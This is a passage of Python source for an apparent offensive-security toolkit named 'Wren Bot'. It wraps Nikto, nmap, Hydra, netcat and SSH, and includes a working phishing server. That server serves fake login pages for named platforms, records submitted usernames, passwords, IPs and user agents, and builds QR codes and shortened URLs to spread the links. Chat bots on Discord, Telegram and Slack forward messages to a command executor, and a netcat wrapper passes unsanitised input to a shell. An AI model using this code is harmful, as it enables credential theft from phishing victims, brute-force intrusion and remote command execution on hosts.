            if options.get('tuning'):
                cmd.extend(['-Tuning', options['tuning']])
            
            output_file = os.path.join(NIKTO_RESULTS_DIR, f"nikto_{target.replace('/', '_')}_{int(time.time())}.txt")
            cmd.extend(['-o', output_file])
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=options.get('timeout', 300))
            scan_time = time.time() - start_time
            vulnerabilities = self._parse_output(result.stdout)
            
            self.db.log_nikto_scan(target, vulnerabilities, output_file, scan_time, result.returncode == 0)
            
            return {
                'success': result.returncode == 0,
                'target': target,
                'timestamp': datetime.datetime.now().isoformat(),
                'vulnerabilities': vulnerabilities,
                'scan_time': scan_time,
                'output_file': output_file,
                'output': result.stdout[:2000]
            }
        except subprocess.TimeoutExpired:
            return {'success': False, 'error': 'Scan timeout', 'target': target}
        except Exception as e:
            return {'success': False, 'error': str(e), 'target': target}
    
    def _parse_output(self, output: str) -> List[Dict]:
        vulnerabilities = []
        for line in output.split('\n'):
            if '+ ' in line or 'OSVDB' in line or 'CVE' in line:
                vulnerabilities.append({'description': line.strip(), 'severity': 'medium'})
        return vulnerabilities
    
    def get_available_scan_types(self) -> List[str]:
        return ["full", "ssl", "cgi", "sql", "xss"]
    
    def check_target_ssl(self, target: str) -> bool:
        try:
            host = target.split(':')[0]
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            result = sock.connect_ex((host, 443))
            sock.close()
            return result == 0
        except:
            return False

# =====================
# WORDLIST MANAGER
# =====================
class WordlistManager:
    def __init__(self, db: DatabaseManager):
        self.db = db
        self.wordlists_dir = WORDLISTS_DIR
    
    def upload_wordlist(self, name: str, file_path: str) -> Dict:
        try:
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                words = f.read().splitlines()
            word_count = len(words)
            
            dest_path = os.path.join(self.wordlists_dir, f"{name}_{int(time.time())}.txt")
            shutil.copy(file_path, dest_path)
            
            wordlist_id = self.db.add_wordlist(name, dest_path, word_count)
            if wordlist_id:
                return {
                    'success': True,
                    'id': wordlist_id,
                    'name': name,
                    'word_count': word_count,
                    'path': dest_path
                }
            return {'success': False, 'error': 'Failed to save to database'}
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def get_wordlists(self) -> List[Dict]:
        return self.db.get_wordlists()
    
    def get_wordlist_words(self, wordlist_id: str, limit: int = None) -> List[str]:
        wordlists = self.db.get_wordlists()
        for wl in wordlists:
            if wl['id'] == wordlist_id:
                try:
                    with open(wl['file_path'], 'r', encoding='utf-8', errors='ignore') as f:
                        words = f.read().splitlines()
                    self.db.update_wordlist_last_used(wordlist_id)
                    if limit:
                        return words[:limit]
                    return words
                except:
                    return []
        return []
    
    def generate_hydra_command(self, wordlist_id: str, target: str, service: str, username: str = None) -> str:
        wordlist_path = None
        wordlists = self.db.get_wordlists()
        for wl in wordlists:
            if wl['id'] == wordlist_id:
                wordlist_path = wl['file_path']
                break
        
        if not wordlist_path:
            return None
        
        if username:
            return f"hydra -l {username} -P {wordlist_path} {target} {service}"
        else:
            return f"hydra -L {wordlist_path} -P {wordlist_path} {target} {service}"
    
    def analyze_wordlist(self, wordlist_id: str) -> Dict:
        words = self.get_wordlist_words(wordlist_id)
        if not words:
            return {'error': 'Wordlist not found'}
        
        avg_length = sum(len(w) for w in words) / max(1, len(words))
        common_patterns = {
            'numbers_only': len([w for w in words if w.isdigit()]),
            'lowercase_only': len([w for w in words if w.islower() and w.isalpha()]),
            'uppercase_only': len([w for w in words if w.isupper() and w.isalpha()]),
            'mixed_case': len([w for w in words if any(c.islower() for c in w) and any(c.isupper() for c in w)]),
            'contains_special': len([w for w in words if any(not c.isalnum() for c in w)]),
        }
        
        return {
            'total_words': len(words),
            'unique_words': len(set(words)),
            'avg_length': round(avg_length, 2),
            'min_length': min(len(w) for w in words),
            'max_length': max(len(w) for w in words),
            'patterns': common_patterns,
            'sample': words[:20]
        }

# =====================
# PHISHING SERVER
# =====================
class PhishingRequestHandler(BaseHTTPRequestHandler):
    server_instance = None
    
    def log_message(self, format, *args):
        pass
    
    def do_GET(self):
        if self.path == '/':
            self.send_phishing_page()
        elif self.path.startswith('/capture'):
            self.send_response(302)
            self.send_header('Location', 'https://www.google.com')
            self.end_headers()
        elif self.path.startswith('/qr'):
            self.send_qr_code()
        else:
            self.send_response(404)
            self.end_headers()
    
    def do_POST(self):
        try:
            content_length = int(self.headers.get('Content-Length', 0))
            post_data = self.rfile.read(content_length).decode('utf-8')
            form_data = urllib.parse.parse_qs(post_data)
            username = form_data.get('email', form_data.get('username', ['']))[0]
            password = form_data.get('password', [''])[0]
            client_ip = self.client_address[0]
            user_agent = self.headers.get('User-Agent', 'Unknown')
            
            if self.server_instance and self.server_instance.db:
                self.server_instance.db.save_captured_credential(
                    self.server_instance.link_id, username, password, client_ip, user_agent)
                print(f"\n{Colors.ERROR}🎣 CREDENTIALS CAPTURED!{Colors.RESET}")
                print(f"  IP: {client_ip}\n  Username: {username}\n  Password: {password}")
            
            self.send_response(302)
            self.send_header('Location', 'https://www.google.com')
            self.end_headers()
        except:
            self.send_response(500)
            self.end_headers()
    
    def send_phishing_page(self):
        if self.server_instance and self.server_instance.html_content:
            self.send_response(200)
            self.send_header('Content-Type', 'text/html')
            self.end_headers()
            self.wfile.write(self.server_instance.html_content.encode('utf-8'))
            if self.server_instance.db and self.server_instance.link_id:
                self.server_instance.db.update_phishing_link_clicks(self.server_instance.link_id)
    
    def send_qr_code(self):
        if self.server_instance and self.server_instance.qr_code_path and os.path.exists(self.server_instance.qr_code_path):
            self.send_response(200)
            self.send_header('Content-Type', 'image/png')
            self.end_headers()
            with open(self.server_instance.qr_code_path, 'rb') as f:
                self.wfile.write(f.read())
        else:
            self.send_response(404)
            self.end_headers()

class PhishingServer:
    def __init__(self, db: DatabaseManager):
        self.db = db
        self.server = None
        self.running = False
        self.link_id = None
        self.html_content = None
        self.qr_code_path = None
    
    def start(self, link_id: str, platform: str, html_content: str, port: int = 8080) -> bool:
        try:
            self.link_id = link_id
            self.html_content = html_content
            handler = PhishingRequestHandler
            handler.server_instance = self
            self.server = socketserver.TCPServer(("0.0.0.0", port), handler)
            thread = threading.Thread(target=self.server.serve_forever, daemon=True)
            thread.start()
            self.running = True
            
            # Generate QR code
            self.generate_qr_code()
            
            return True
        except:
            return False
    
    def stop(self):
        if self.server:
            self.server.shutdown()
            self.server.server_close()
            self.running = False
    
    def get_url(self) -> str:
        return f"http://{self._get_local_ip()}:8080"
    
    def generate_qr_code(self):
        if not QRCODE_AVAILABLE:
            return
        
        try:
            url = self.get_url()
            qr_path = os.path.join(PHISHING_DIR, f"qr_{self.link_id}.png")
            qr = qrcode.QRCode(version=1, box_size=10, border=5)
            qr.add_data(url)
            qr.make(fit=True)
            img = qr.make_image(fill_color="black", back_color="white")
            img.save(qr_path)
            self.qr_code_path = qr_path
            self.db.update_phishing_link_qr(self.link_id, qr_path)
        except:
            pass
    
    def _get_local_ip(self) -> str:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "127.0.0.1"

# =====================
# SOCIAL ENGINEERING TOOLS
# =====================
class SocialEngineeringTools:
    def __init__(self, db: DatabaseManager):
        self.db = db
        self.phishing_server = PhishingServer(db)
        self.active_links = {}
    
    def generate_phishing_link(self, platform: str, custom_url: str = None) -> Dict:
        try:
            link_id = str(uuid.uuid4())[:8]
            templates = self.db.get_phishing_templates(platform)
            if templates:
                html_content = templates[0].get('html_content', '')
            else:
                html_content = self._get_default_template(platform)
            
            phishing_link = PhishingLink(
                id=link_id, platform=platform, original_url=custom_url or f"https://www.{platform}.com",
                phishing_url=f"http://localhost:8080", template=platform,
                created_at=datetime.datetime.now().isoformat())
            
            self.db.save_phishing_link(phishing_link)
            self.active_links[link_id] = {'platform': platform, 'html': html_content}
            
            return {'success': True, 'link_id': link_id, 'platform': platform, 'phishing_url': phishing_link.phishing_url}
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def _get_default_template(self, platform: str) -> str:
        return f"""<!DOCTYPE html>
<html><head><title>{platform} Login</title>
<style>
body{{font-family:Arial;display:flex;justify-content:center;align-items:center;min-height:100vh;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%)}}
.login-box{{background:white;border-radius:16px;padding:40px;width:400px;box-shadow:0 20px 60px rgba(0,0,0,0.3)}}
.logo{{font-size:32px;text-align:center;margin-bottom:20px;color:#667eea}}
input{{width:100%;padding:12px;margin:10px 0;border:1px solid #ddd;border-radius:8px}}
button{{width:100%;padding:12px;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);color:white;border:none;border-radius:8px;cursor:pointer}}
.warning{{margin-top:20px;padding:10px;background:#f8d7da;color:#721c24;text-align:center;border-radius:8px}}
</style>
</head>
<body>
<div class="login-box">
<div class="logo">🐦 {platform}</div>
<form method="POST" action="/capture">
<input type="text" name="username" placeholder="Username or Email" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Sign In</button>
</form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>"""
    
    def start_phishing_server(self, link_id: str, port: int = 8080) -> bool:
        if link_id not in self.active_links:
            return False
        link_data = self.active_links[link_id]
        return self.phishing_server.start(link_id, link_data['platform'], link_data['html'], port)
    
    def stop_phishing_server(self):
        self.phishing_server.stop()
    
    def get_server_url(self) -> str:
        return self.phishing_server.get_url()
    
    def get_active_links(self) -> List[Dict]:
        return [{'link_id': lid, 'platform': data['platform']} for lid, data in self.active_links.items()]
    
    def get_captured_credentials(self, link_id: str = None) -> List[Dict]:
        return self.db.get_captured_credentials(link_id)
    
    def generate_qr_code(self, link_id: str) -> Optional[str]:
        link = self.db.get_phishing_link(link_id)
        if not link:
            return None
        url = self.phishing_server.get_url() if self.phishing_server.running else link.get('phishing_url', '')
        qr_filename = os.path.join(PHISHING_DIR, f"qr_{link_id}.png")
        if QRCODE_AVAILABLE:
            try:
                qr = qrcode.QRCode(version=1, box_size=10, border=5)
                qr.add_data(url)
                qr.make(fit=True)
                img = qr.make_image(fill_color="black", back_color="white")
                img.save(qr_filename)
                self.db.update_phishing_link_qr(link_id, qr_filename)
                return qr_filename
            except:
                pass
        return None
    
    def shorten_url(self, link_id: str) -> Optional[str]:
        link = self.db.get_phishing_link(link_id)
        if not link:
            return None
        url = self.phishing_server.get_url() if self.phishing_server.running else link.get('phishing_url', '')
        if SHORTENER_AVAILABLE:
            try:
                s = pyshorteners.Shortener()
                return s.tinyurl.short(url)
            except:
                pass
        return url

# =====================
# NETWORK TOOLS
# =====================
class NetworkTools:
    @staticmethod
    def execute_command(cmd: List[str], timeout: int = 60, shell: bool = False) -> Dict:
        start_time = time.time()
        try:
            if shell:
                result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
            else:
                result = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
            return {
                'success': result.returncode == 0,
                'output': result.stdout + result.stderr,
                'execution_time': time.time() - start_time
            }
        except subprocess.TimeoutExpired:
            return {'success': False, 'output': f'Command timed out after {timeout}s', 'execution_time': timeout}
        except Exception as e:
            return {'success': False, 'output': str(e), 'execution_time': time.time() - start_time}
    
    @staticmethod
    def ping(target: str, count: int = 4) -> Dict:
        if platform.system().lower() == 'windows':
            return NetworkTools.execute_command(['ping', '-n', str(count), target])
        else:
            return NetworkTools.execute_command(['ping', '-c', str(count), target])
    
    @staticmethod
    def traceroute(target: str) -> Dict:
        if platform.system().lower() == 'windows':
            return NetworkTools.execute_command(['tracert', '-d', target])
        else:
            return NetworkTools.execute_command(['traceroute', '-n', target])
    
    @staticmethod
    def nmap_scan(target: str, ports: str = "1-1000", scan_type: str = "quick") -> Dict:
        try:
            if scan_type == "quick":
                cmd = ['nmap', '-T4', '-F', target]
            elif scan_type == "full":
                cmd = ['nmap', '-p-', '-T4', target]
            elif scan_type == "stealth":
                cmd = ['nmap', '-sS', '-T2', '--max-parallelism', '100', target]
            elif scan_type == "version":
                cmd = ['nmap', '-sV', '-sC', '-T4', target]
            elif scan_type == "os":
                cmd = ['nmap', '-O', '--osscan-guess', target]
            else:
                cmd = ['nmap', '-p', ports, target]
            return NetworkTools.execute_command(cmd, timeout=300)
        except Exception as e:
            return {'success': False, 'output': str(e)}
    
    @staticmethod
    def nmap_ping_sweep(network: str) -> Dict:
        return NetworkTools.execute_command(['nmap', '-sn', network], timeout=120)
    
    @staticmethod
    def whois_lookup(target: str) -> Dict:
        if not WHOIS_AVAILABLE:
            return {'success': False, 'output': 'WHOIS not available'}
        try:
            result = whois.whois(target)
            return {'success': True, 'output': str(result)}
        except Exception as e:
            return {'success': False, 'output': str(e)}
    
    @staticmethod
    def get_ip_location(ip: str) -> Dict:
        try:
            response = requests.get(f"http://ip-api.com/json/{ip}", timeout=10)
            if response.status_code == 200:
                data = response.json()
                if data.get('status') == 'success':
                    return {'success': True, 'country': data.get('country'), 'city': data.get('city'), 
                           'isp': data.get('isp'), 'lat': data.get('lat'), 'lon': data.get('lon')}
            return {'success': False, 'error': 'Location lookup failed'}
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    @staticmethod
    def get_local_ip() -> str:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "127.0.0.1"
    
    @staticmethod
    def shorten_url(url: str) -> str:
        if not SHORTENER_AVAILABLE:
            return url
        try:
            s = pyshorteners.Shortener()
            return s.tinyurl.short(url)
        except:
            return url
    
    @staticmethod
    def generate_qr_code(url: str, filename: str) -> bool:
        if not QRCODE_AVAILABLE:
            return False
        try:
            qr = qrcode.QRCode(version=1, box_size=10, border=5)
            qr.add_data(url)
            qr.make(fit=True)
            img = qr.make_image(fill_color="black", back_color="white")
            img.save(filename)
            return True
        except:
            return False
    
    @staticmethod
    def block_ip_firewall(ip: str) -> bool:
        try:
            if platform.system().lower() == 'linux':
                if shutil.which('iptables'):
                    subprocess.run(['sudo', 'iptables', '-A', 'INPUT', '-s', ip, '-j', 'DROP'], timeout=10)
                    return True
            elif platform.system().lower() == 'windows':
                subprocess.run(['netsh', 'advfirewall', 'firewall', 'add', 'rule',
                               f'name=WrenBot_Block_{ip}', 'dir=in', 'action=block', f'remoteip={ip}'], timeout=10)
                return True
            return False
        except:
            return False
    
    @staticmethod
    def unblock_ip_firewall(ip: str) -> bool:
        try:
            if platform.system().lower() == 'linux':
                if shutil.which('iptables'):
                    subprocess.run(['sudo', 'iptables', '-D', 'INPUT', '-s', ip, '-j', 'DROP'], timeout=10)
                    return True
            elif platform.system().lower() == 'windows':
                subprocess.run(['netsh', 'advfirewall', 'firewall', 'delete', 'rule',
                               f'name=WrenBot_Block_{ip}'], timeout=10)
                return True
            return False
        except:
            return False
    
    @staticmethod
    def dig(domain: str, record_type: str = "A") -> Dict:
        return NetworkTools.execute_command(['dig', domain, record_type, '+short'], timeout=10)
    
    @staticmethod
    def nslookup(domain: str) -> Dict:
        return NetworkTools.execute_command(['nslookup', domain], timeout=10)
    
    @staticmethod
    def host(domain: str) -> Dict:
        return NetworkTools.execute_command(['host', domain], timeout=10)
    
    @staticmethod
    def curl(url: str, method: str = "GET", data: str = None, headers: List[str] = None) -> Dict:
        cmd = ['curl', '-s', '-X', method]
        if headers:
            for h in headers:
                cmd.extend(['-H', h])
        if data:
            cmd.extend(['-d', data])
        cmd.append(url)
        return NetworkTools.execute_command(cmd, timeout=30)
    
    @staticmethod
    def wget(url: str, output: str = None) -> Dict:
        cmd = ['wget', '-q']
        if output:
            cmd.extend(['-O', output])
        cmd.append(url)
        return NetworkTools.execute_command(cmd, timeout=60)
    
    @staticmethod
    def nc(host: str, port: int, data: str = None) -> Dict:
        if data:
            cmd = f"echo '{data}' | nc {host} {port}"
            return NetworkTools.execute_command([cmd], timeout=30, shell=True)
        else:
            return NetworkTools.execute_command(['nc', '-zv', '-w', '2', host, str(port)], timeout=10)
    
    @staticmethod
    def ssh(user: str, host: str, command: str = None, port: int = 22) -> Dict:
        if command:
            cmd = ['ssh', '-p', str(port), f"{user}@{host}", command]
        else:
            cmd = ['ssh', '-p', str(port), f"{user}@{host}"]
        return NetworkTools.execute_command(cmd, timeout=60)
    
    @staticmethod
    def scp(source: str, destination: str, port: int = 22) -> Dict:
        cmd = ['scp', '-P', str(port), source, destination]
        return NetworkTools.execute_command(cmd, timeout=120)
    
    @staticmethod
    def hydra(target: str, service: str, username: str = None, password_list: str = None) -> Dict:
        cmd = ['hydra']
        if username:
            cmd.extend(['-l', username])
        if password_list:
            cmd.extend(['-P', password_list])
        cmd.extend([target, service])
        return NetworkTools.execute_command(cmd, timeout=300)
    
    @staticmethod
    def analyze_ports(scan_output: str) -> Tuple[List[Dict], List[Dict]]:
        open_ports = []
        closed_ports = []
        lines = scan_output.split('\n')
        for line in lines:
            if '/tcp' in line or '/udp' in line:
                parts = line.split()
                if len(parts) >= 3:
                    port_proto = parts[0].split('/')
                    if len(port_proto) == 2:
                        try:
                            port = int(port_proto[0])
                            protocol = port_proto[1]
                            state = parts[1]
                            service = parts[2] if len(parts) > 2 else 'unknown'
                            if state == 'open':
                                open_ports.append({'port': port, 'protocol': protocol, 'service': service})
                            elif state == 'closed':
                                closed_ports.append({'port': port, 'protocol': protocol})
                        except:
                            continue
        return open_ports, closed_ports

# =====================
# DISCORD BOT
# =====================
class DiscordBot:
    def __init__(self, command_handler, db: DatabaseManager):
        self.handler = command_handler
        self.db = db
        self.bot = None
        self.running = False
        self.config = self._load_config()
    
    def _load_config(self) -> Dict:
        try:
            if os.path.exists(DISCORD_CONFIG_FILE):
                with open(DISCORD_CONFIG_FILE, 'r') as f:
                    return json.load(f)
        except:
            pass
        return {'enabled': False, 'token': '', 'prefix': '!'}
    
    def save_config(self, token: str, enabled: bool = True, prefix: str = '!') -> bool:
        try:
            config = {'enabled': enabled, 'token': token, 'prefix': prefix}
            with open(DISCORD_CONFIG_FILE, 'w') as f:
                json.dump(config, f, indent=4)
            self.config = config
            return True
        except:
            return False
    
    def setup(self) -> bool:
        if not DISCORD_AVAILABLE:
            return False
        if not self.config.get('token'):
            return False
        
        intents = discord.Intents.default()
        intents.message_content = True
        self.bot = commands.Bot(command_prefix=self.config.get('prefix', '!'), intents=intents)
        
        @self.bot.event
        async def on_ready():
            print(f"{Colors.SUCCESS}✅ Discord bot connected as {self.bot.user}{Colors.RESET}")
            self.running = True
        
        @self.bot.event
        async def on_message(message):
            if message.author.bot:
                return
            if message.content.startswith(self.config.get('prefix', '!')):
                cmd = message.content[len(self.config.get('prefix', '!')):].strip()
                result = self.handler.execute(cmd, 'discord', str(message.author))
                output = result.get('output', '')[:1900]
                embed = discord.Embed(title="🐦 Wren Bot Response", description=f"```{output}```",
                                     color=0x0a6eff)
                embed.set_footer(text=f"Time: {result.get('execution_time', 0):.2f}s")
                await message.channel.send(embed=embed)
            await self.bot.process_commands(message)
        return True
    
    def start(self):
        if self.bot:
            thread = threading.Thread(target=self._run, daemon=True)
            thread.start()
    
    def _run(self):
        try:
            self.bot.run(self.config['token'])
        except Exception as e:
            logger.error(f"Discord bot error: {e}")

# =====================
# TELEGRAM BOT
# =====================
class TelegramBot:
    def __init__(self, command_handler, db: DatabaseManager):
        self.handler = command_handler
        self.db = db
        self.client = None
        self.running = False
        self.config = self._load_config()
    
    def _load_config(self) -> Dict:
        try:
            if os.path.exists(TELEGRAM_CONFIG_FILE):
                with open(TELEGRAM_CONFIG_FILE, 'r') as f:
                    return json.load(f)
        except:
            pass
        return {'enabled': False, 'api_id': '', 'api_hash': '', 'bot_token': ''}
    
    def save_config(self, api_id: str = "", api_hash: str = "", bot_token: str = "", enabled: bool = True) -> bool:
        try:
            config = {'enabled': enabled, 'api_id': api_id, 'api_hash': api_hash, 'bot_token': bot_token}
            with open(TELEGRAM_CONFIG_FILE, 'w') as f:
                json.dump(config, f, indent=4)
            self.config = config
            return True
        except:
            return False
    
    def setup(self) -> bool:
        if not TELETHON_AVAILABLE:
            return False
        if not self.config.get('api_id') or not self.config.get('api_hash'):
            return False
        
        self.client = TelegramClient('wren_bot_session', self.config['api_id'], self.config['api_hash'])
        
        @self.client.on(events.NewMessage)
        async def handler(event):
            if event.message.text and event.message.text.startswith('/'):
                cmd = event.message.text[1:].strip()
                result = self.handler.execute(cmd, 'telegram', str(event.sender_id))
                output = result.get('output', '')[:4000]
                await event.reply(f"```{output}```\n_Time: {result.get('execution_time', 0):.2f}s_", parse_mode='markdown')
        return True
    
    def start(self):
        if self.client:
            thread = threading.Thread(target=self._run, daemon=True)
            thread.start()
    
    def _run(self):
        try:
            async def main():
                await self.client.start(bot_token=self.config.get('bot_token'))
                print(f"{Colors.SUCCESS}✅ Telegram bot connected{Colors.RESET}")
                await self.client.run_until_disconnected()
            asyncio.run(main())
        except Exception as e:
            logger.error(f"Telegram bot error: {e}")

# =====================
# SLACK BOT
# =====================
class SlackBot:
    def __init__(self, command_handler, db: DatabaseManager):
        self.handler = command_handler
        self.db = db
        self.client = None
        self.running = False
        self.config = self._load_config()
        self.last_ts = {}
    
    def _load_config(self) -> Dict:
        try:
            if os.path.exists(SLACK_CONFIG_FILE):
                with open(SLACK_CONFIG_FILE, 'r') as f:
                    return json.load(f)
        except:
            pass
        return {'enabled': False, 'bot_token': '', 'channel_id': '', 'prefix': '!'}
    
    def save_config(self, bot_token: str, channel_id: str = "", enabled: bool = True, prefix: str = '!') -> bool:
        try:
            config = {'enabled': enabled, 'bot_token': bot_token, 'channel_id': channel_id, 'prefix': prefix}
            with open(SLACK_CONFIG_FILE, 'w') as f:
                json.dump(config, f, indent=4)
            self.config = config
            return True
        except:
            return False
    
    def setup(self) -> bool:
        if not SLACK_AVAILABLE:
            return False
        if not self.config.get('bot_token'):
            return False
        self.client = WebClient(token=self.config['bot_token'])
        return True
    
    def start(self):
        if self.client:
            thread = threading.Thread(target=self._monitor, daemon=True)
            thread.start()
            self.running = True
    
    def _monitor(self):
        channel = self.config.get('channel_id', 'general')
        while self.running:
            try:
                response = self.client.conversations_history(channel=channel, limit=5)
                if response['ok'] and response['messages']:
                    for msg in response['messages']:
                        if msg.get('text', '').startswith(self.config.get('prefix', '!')):
                            ts = msg.get('ts')
                            if self.last_ts.get(channel) != ts:
                                self.last_ts[channel] = ts
                                cmd = msg['text'][len(self.config.get('prefix', '!')):].strip()
                                result = self.handler.execute(cmd, 'slack', msg.get('user', 'unknown'))
                                self.client.chat_postMessage(
                                    channel=channel,
                                    text=f"```{result.get('output', '')[:2000]}```\n*Time: {result.get('execution_time', 0):.2f}s*")
                time.sleep(2)
            except Exception as e:
                logger.error(f"Slack monitor error: {e}")
                time.sleep(10)

# =====================
# WHATSAPP BOT
# =====================
class WhatsAppBot:
    def __init__(self, command_handler, db: DatabaseManager):
        self.handler = command_handler
        self.db = db
        self.driver = None
        self.running = False
        self.config = self._load_config()
    
    def _load_config(self) -> Dict:
        try:
            if os.path.exists(WHATSAPP_CONFIG_FILE):
                with open(WHATSAPP_CONFIG_FILE, 'r') as f:
                    return json.load(f)
        except:
            pass
        return {'enabled': False, 'phone_number': '', 'prefix': '/'}
    
    def save_config(self, phone_number: str = "", enabled: bool = True, prefix: str = '/') -> bool:
        try:
            config = {'enabled': enabled, 'phone_number': phone_number, 'prefix': prefix}
            with open(WHATSAPP_CONFIG_FILE, 'w') as f:
                json.dump(config, f, indent=4)
            self.config = config
            return True
        except:
            return False
    
    def setup(self) -> bool:
        if not SELENIUM_AVAILABLE:
            return False
        if not WEBDRIVER_MANAGER_AVAILABLE:
            return False
        return True
    
    def start(self):
        if self.setup():
            thread = threading.Thread(target=self._run, daemon=True)
            thread.start()
    
    def _run(self):
        try:
            options = Options()
            options.add_argument('--headless=new')
            options.add_argument('--no-sandbox')
            options.add_argument('--disable-dev-shm-usage')
            options.add_argument('--user-data-dir=' + WHATSAPP_SESSION_DIR)
            service = Service(ChromeDriverManager().install())
            self.driver = webdriver.Chrome(service=service, options=options)
            self.driver.get('https://web.whatsapp.com')
            print(f"{Colors.WARNING}📱 WhatsApp Web opened. Scan QR code to connect.{Colors.RESET}")
            time.sleep(15)
            self.running = True
            while self.running:
                try:
                    time.sleep(5)
                except:
                    pass
        except Exception as e:
            logger.error(f"WhatsApp bot error: {e}")

# =====================
# IMESSAGE BOT
# =====================
class iMessageBot:
    def __init__(self, command_handler, db: DatabaseManager):
        self.handler = command_handler
        self.db = db
        self.running = False
        self.config = self._load_config()
    
    def _load_config(self) -> Dict:
        try:
            if os.path.exists(IMESSAGE_CONFIG_FILE):
                with open(IMESSAGE_CONFIG_FILE, 'r') as f:
                    return json.load(f)
        except:
            pass
        return {'enabled': False, 'phone_numbers': [], 'prefix': '!'}
    
    def save_config(self, phone_numbers: List[str] = None, enabled: bool = True, prefix: str = '!') -> bool:
        try:
            config = {'enabled': enabled, 'phone_numbers': phone_numbers or [], 'prefix': prefix}
            with open(IMESSAGE_CONFIG_FILE, 'w') as f:
                json.dump(config, f, indent=4)
            self.config = config
            return True
        except:
            return False
    
    def setup(self) -> bool:
        if not IMESSAGE_AVAILABLE:
            return False
        return True
    
    def start(self):
        if self.setup():
            thread = threading.Thread(target=self._monitor, daemon=True)
            thread.start()
            self.running = True
    
    def _monitor(self):
        while self.running:
            try:
                time.sleep(10)
            except:
                pass
    
    def send_message(self, phone: str, message: str):
        try:
            script = f'tell application "Messages" to send "{message}" to buddy "{phone}"'
            subprocess.run(['osascript', '-e', script], timeout=10)
            return True
        except:
            return False

# =====================
# GOOGLE CHAT BOT
# =====================
class GoogleChatBot:
    def __init__(self, command_handler, db: DatabaseManager):
        self.handler = command_handler
        self.db = db
        self.client = None
        self.running = False
        self.config = self._load_config()
    
    def _load_config(self) -> Dict:
        try:
            if os.path.exists(GOOGLE_CHAT_CONFIG_FILE):
                with open(GOOGLE_CHAT_CONFIG_FILE, 'r') as f:
                    return json.load(f)
        except:
            pass
        return {'enabled': False, 'webhook_url': '', 'space_name': ''}
    
    def save_config(self, webhook_url: str = "", space_name: str = "", enabled: bool = True) -> bool:
        try:
            config = {'enabled': enabled, 'webhook_url': webhook_url, 'space_name': space_name}
            with open(GOOGLE_CHAT_CONFIG_FILE, 'w') as f:
                json.dump(config, f, indent=4)
            self.config = config
            return True
        except:
            return False
    
    def setup(self) -> bool:
        if not GOOGLE_CHAT_AVAILABLE:
            return False
        return True
    
    def send_message(self, message: str):
        if not self.config.get('webhook_url'):
            return False
        try:
            data = {'text': message}
            response = requests.post(self.config['webhook_url'], json=data, timeout=10)
            return response.status_code == 200
        except:
            return False
    
    def start(self):
        if self.setup():
            self.running = True
            print(f"{Colors.SUCCESS}✅ Google Chat bot configured{Colors.RESET}")

# =====================
# WEB SERVER WITH COMPLETE UI
# =====================
WEB_HTML = """<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>🐦 AWESOME WREN BOT | Cyber Terminal</title>
    <script src="https://cdn.jsdelivr.net/npm/chart.js@4.4.0/dist/chart.umd.min.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Fira Code', monospace; }
        body { background: #0a0c12; min-height: 100vh; padding: 20px; transition: background 0.2s ease; }
        :root {
            --primary: #0a6eff;
            --primary-glow: rgba(10, 110, 255, 0.4);
            --card-bg: #151821;
            --border: #2a2f3f;
            --text: #eef2ff;
            --success: #2ecc71;
            --warning: #f1c40f;
            --error: #e74c3c;
        }
        body.theme-blue { --primary: #0a6eff; --primary-glow: rgba(10,110,255,0.4); }
        body.theme-orange { --primary: #ff8c42; --primary-glow: rgba(255,140,66,0.4); }
        body.theme-purple { --primary: #b980ff; --primary-glow: rgba(185,128,255,0.4); }
        body.theme-green { --primary: #2ecc71; --primary-glow: rgba(46,204,113,0.4); }
        .app-container { max-width: 1600px; margin: 0 auto; }
        .header {
            display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap;
            margin-bottom: 28px; background: var(--card-bg); border-radius: 28px;
            padding: 16px 28px; border: 1px solid var(--border);
        }
        .logo-area { display: flex; align-items: center; gap: 12px; }
        .wren-icon { font-size: 2.8rem; }
        .logo-text h1 { font-size: 1.8rem; background: linear-gradient(135deg, var(--primary), #fff); -webkit-background-clip: text; background-clip: text; color: transparent; }
        .theme-panel { display: flex; gap: 12px; background: rgba(0,0,0,0.3); padding: 8px 16px; border-radius: 60px; }
        .theme-btn { width: 36px; height: 36px; border-radius: 50%; cursor: pointer; border: 2px solid transparent; transition: 0.2s; }
        .theme-btn.blue { background: #0a6eff; }
        .theme-btn.orange { background: #ff8c42; }
        .theme-btn.purple { background: #b980ff; }
        .theme-btn.green { background: #2ecc71; }
        .theme-btn.active { border-color: white; transform: scale(1.1); }
        .terminal-card {
            background: #0c0f16; border-radius: 28px; border: 1px solid var(--border);
            padding: 20px; margin-bottom: 30px;
        }
        .cmd-input-group { display: flex; gap: 12px; flex-wrap: wrap; margin-bottom: 20px; }
        #commandInput {
            flex: 4; background: #010101dd; border: 1px solid var(--primary); border-radius: 60px;
            padding: 14px 20px; font-size: 1rem; color: #b9f2ff; outline: none;
        }
        .btn-exec {
            background: var(--primary); border: none; padding: 0 28px; border-radius: 60px;
            font-weight: bold; color: #111; cursor: pointer; transition: 0.2s;
        }
        .btn-exec:hover { filter: brightness(1.1); transform: scale(0.98); }
        .output-area {
            background: #020408cc; border-radius: 20px; padding: 16px;
            max-height: 220px; overflow-y: auto; font-family: monospace;
